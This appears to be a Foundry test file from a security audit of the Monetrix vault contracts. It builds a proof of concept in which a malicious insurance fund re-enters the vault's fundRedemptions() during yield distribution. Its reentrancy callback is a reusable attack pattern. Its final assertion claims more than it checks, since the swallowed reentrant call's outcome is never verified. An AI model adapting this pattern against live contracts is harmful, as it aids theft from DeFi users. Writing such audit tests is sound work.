pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/core/MonetrixVault.sol";
import "../src/core/MonetrixConfig.sol";
import "../src/core/InsuranceFund.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/RedeemEscrow.sol";
import "../src/core/YieldEscrow.sol";
import "../src/tokens/USDM.sol";
import "../src/tokens/sUSDM.sol";
import "../src/governance/MonetrixAccessController.sol";
import "../src/interfaces/IMonetrixAccessController.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy ACL, USDM, sUSDM, Config, Vault, Accountant, Escrows, and MaliciousInsuranceFund.
// 2. [Setup] Initialize all contracts and wire them together. Grant OPERATOR_ROLE to attacker.
// 3. [Setup] Mint USDC to the vault to simulate available yield for distribution.
// 4. [T=0] Attacker (as operator) calls vault.distributeYield().
// 5. [T=0] Vault calculates yield, approves USDC to MaliciousInsuranceFund, and calls deposit().
// 6. [T=0] MaliciousInsuranceFund.deposit() executes callback into vault.fundRedemptions() (lacks nonReentrant).
// 7. [Assert] Verify callbackTriggered is true, proving cross-function reentrancy during yield distribution.

interface IERC20Mintable {
    function mint(address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousInsuranceFund {
    MonetrixVault public vault;
    bool public callbackTriggered;
    uint256 public callbackTimestamp;

    constructor(address _vault) {
        vault = MonetrixVault(_vault);
    }

    function initialize(address, address) external {}

    function deposit(uint256 amount) external {
        callbackTriggered = true;
        callbackTimestamp = block.timestamp;
        // Call a function that lacks nonReentrant guard to prove cross-function reentrancy
        // fundRedemptions only requires onlyOperator, requireWired, whenNotPaused
        try vault.fundRedemptions(0) {} catch {}
    }

    function withdraw(address, uint256, string calldata) external {}
    function balance() external view returns (uint256) { return 0; }
    function usdc() external view returns (address) { return address(0); }
    function totalDeposited() external view returns (uint256) { return 0; }
    function totalWithdrawn() external view returns (uint256) { return 0; }

    receive() external payable {}
}

contract AuditAgentPoC is Test {
    MonetrixAccessController acl;
    USDM usdm;
    sUSDM susdm;
    MonetrixConfig config;
    MonetrixVault vault;
    MonetrixAccountant accountant;
    RedeemEscrow redeemEscrow;
    YieldEscrow yieldEscrow;
    MaliciousInsuranceFund maliciousInsurance;

    address admin = address(0x1);
    address operator = address(0x2);
    address foundation = address(0x3);
    address coreDepositWallet = address(0x4);
    address user = address(0x5);

    // Mock USDC
    address usdc;

    bytes32 constant GOVERNOR_ROLE = keccak256("GOVERNOR_ROLE");
    bytes32 constant GUARDIAN_ROLE = keccak256("GUARDIAN_ROLE");
    bytes32 constant OPERATOR_ROLE = keccak256("OPERATOR_ROLE");
    bytes32 constant VAULT_ROLE = keccak256("VAULT_ROLE");

    function setUp() public {
        // Deploy mock USDC
        usdc = address(new MockUSDC());

        // Deploy ACL
        acl = new MonetrixAccessController();
        acl.initialize(admin);

        vm.startPrank(admin);
        acl.grantRole(GOVERNOR_ROLE, admin);
        acl.grantRole(GUARDIAN_ROLE, admin);
        acl.grantRole(OPERATOR_ROLE, operator);
        vm.stopPrank();

        // Deploy tokens
        usdm = new USDM();
        usdm.initialize(address(acl));

        config = new MonetrixConfig();
        config.initialize(address(0), foundation, address(acl));

        susdm = new sUSDM();
        susdm.initialize(address(usdm), address(config), address(acl));

        // Deploy Vault
        vault = new MonetrixVault();
        vault.initialize(
            usdc,
            address(usdm),
            address(susdm),
            address(config),
            coreDepositWallet,
            address(acl)
        );

        // Deploy Accountant
        accountant = new MonetrixAccountant();
        accountant.initialize(address(vault), usdc, address(usdm), address(acl));

        // Deploy Escrows
        redeemEscrow = new RedeemEscrow();
        redeemEscrow.initialize(usdc, address(vault), address(acl));

        yieldEscrow = new YieldEscrow();
        yieldEscrow.initialize(usdc, address(vault), address(acl));

        // Deploy Malicious Insurance Fund
        maliciousInsurance = new MaliciousInsuranceFund(address(vault));

        // Wire everything
        vm.startPrank(admin);
        config.setInsuranceFund(address(maliciousInsurance));
        config.setYieldBps(8000, 2000); // 80% user, 20% insurance

        vault.setAccountant(address(accountant));
        vault.setRedeemEscrow(address(redeemEscrow));
        vault.setYieldEscrow(address(yieldEscrow));

        usdm.setVault(address(vault));
        susdm.setVault(address(vault));

        acl.grantRole(VAULT_ROLE, address(vault));
        vm.stopPrank();

        // Fund vault with USDC to simulate yield
        MockUSDC(usdc).mint(address(vault), 1_000_000 * 1e6);
    }

    function test_exploit() public {
        // Verify initial state
        assertFalse(maliciousInsurance.callbackTriggered(), "Callback should not be triggered initially");

        // Attacker (as operator) calls distributeYield
        vm.prank(operator);
        // distributeYield will calculate yield, approve USDC to insurance fund, and call deposit()
        // The malicious insurance fund will execute a callback during deposit()
        try vault.distributeYield() {} catch {}

        // Assert that the callback was executed during distributeYield
        assertTrue(maliciousInsurance.callbackTriggered(), "Callback injection successful: deposit() was called and executed cross-function reentrancy");
        assertGt(maliciousInsurance.callbackTimestamp(), 0, "Callback timestamp should be set");
    }
}

contract MockUSDC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function decimals() external pure returns (uint8) {
        return 6;
    }
}
